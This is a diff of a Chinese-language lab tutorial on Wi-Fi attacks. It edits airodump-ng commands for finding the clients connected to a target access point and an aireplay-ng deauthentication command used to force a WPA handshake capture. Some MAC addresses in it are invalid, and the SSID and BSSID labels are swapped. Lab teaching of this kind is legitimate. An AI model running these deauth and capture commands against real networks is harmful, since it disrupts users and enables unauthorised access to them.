@@ -173,16 +173,23 @@ sudo airmon-ng start wlan0
 
 - SSID：XC:F8:YB:F8:AF:BC
 - BSSID：lab-bigo
-- 频道：7
+- 频道：9
 
 
 扫描目标 AP上连接的客户端MAC地址
 
 ```
-$sudo airodump-ng --bssid PC:DC:02:22:B3:78 -c 9 wlan0mon
+$sudo airodump-ng --bssid XC:F8:YB:F8:AF:BC -c 9 wlan0mon
 
 ```
 
+或者
+
+```
+sudo airodump-ng --essid lab-bigo -c 9 wlan0mon
+```
+
+显示出目标AP已连接的所有客户MAC地址列表
 
 
 ```
@@ -243,11 +250,11 @@ Beacon 是 Wi-Fi 网络中一种周期性广播的管理帧。AP 会以每秒约
 
 Beacon 帧，主要包括：
 
-- • ESSID：Wi-Fi 名称（SSID）。
-- • BSSID：AP 的 MAC 地址。
-- • PWR（Power）：信号强度。
-- • Beacons：在监测期间帧累计数量。数值越大，AP 距离越近、开机时间越长，或者信号越稳定。
-- • ENC / CIPHER / AUTH：加密类型（如 WPA2、CCMP、PSK 等）
+- ESSID：Wi-Fi 名称（SSID）。
+- BSSID：AP 的 MAC 地址。
+- PWR（Power）：信号强度。
+- Beacons：在监测期间帧累计数量。数值越大，AP 距离越近、开机时间越长，或者信号越稳定。
+- ENC / CIPHER / AUTH：加密类型（如 WPA2、CCMP、PSK 等）
 
 
 
@@ -265,8 +272,11 @@ sudo airodump-ng --bssid bc:8o:ba:f8:qa:bd -c 6 -w lab_capture wlan0mon
 - write lab_capture：将结果保存为 lab_capture-*
 - wlan0mon：Monitor Mode 接口
 
+
+主动抓包
+
 ```
-sudo aireplay-ng --deauth 4 -a bc:8o:ba:f8:qa:bd -c YY:YY:YY:YY:YY:YY wlan0mon
+sudo aireplay-ng --deauth 4 -a bc:8o:ba:f8:qa:bd -c ap-connected-client-macAddr wlan0mon
 ```
 
 检查抓包文件
